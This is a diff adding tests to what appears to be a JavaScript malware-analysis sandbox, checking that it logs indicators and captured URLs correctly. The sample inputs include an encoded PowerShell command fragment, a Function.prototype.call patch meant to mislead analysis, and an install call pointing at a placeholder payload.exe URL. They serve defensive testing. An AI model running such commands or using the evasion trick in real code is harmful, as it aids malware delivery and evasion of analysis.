@@ -429,3 +429,37 @@ describe("lib surface and name aliases", function() {
 		}
 	});
 });
+
+describe("String objects at the top level, and a patched Function.prototype.call", function() {
+	this.timeout(90000);
+
+	it("writes a top-level String-object or BigInt IOC value as a string", function() {
+		const run = runSample(
+			"lib.logIOC(\"TopStr\", new String(\"powershell -nop -enc SQBFAFgA\"), \"t\");\n" +
+			"lib.logIOC(\"TopBig\", BigInt(7), \"b\");\n"
+		);
+		try {
+			const iocs = run.read("IOC.json");
+			assert.strictEqual(iocs.find((e) => e.type === "TopStr").value, "powershell -nop -enc SQBFAFgA");
+			assert.strictEqual(iocs.find((e) => e.type === "TopBig").value, "7");
+		} finally {
+			fs.rmSync(run.work, {recursive: true, force: true});
+		}
+	});
+
+	it("is not steered by a patched Function.prototype.call", function() {
+		const run = runSample(
+			"var FP = Object.getPrototypeOf(function () {});\n" +
+			"FP.call = function () { return \"http://decoy.example/benign.txt\"; };\n" +
+			"InstallProduct(new String(\"http://real.example/payload.exe\"));\n" +
+			"lib.logIOC(\"Headers\", {headers: {Authorization: \"Bearer secret\"}}, \"h\");\n"
+		);
+		try {
+			assert.deepStrictEqual(run.read("urls.json"), ["http://real.example/payload.exe"]);
+			const h = run.read("IOC.json").find((e) => e.type === "Headers");
+			assert.deepStrictEqual(h.value, {headers: {Authorization: "Bearer secret"}});
+		} finally {
+			fs.rmSync(run.work, {recursive: true, force: true});
+		}
+	});
+});
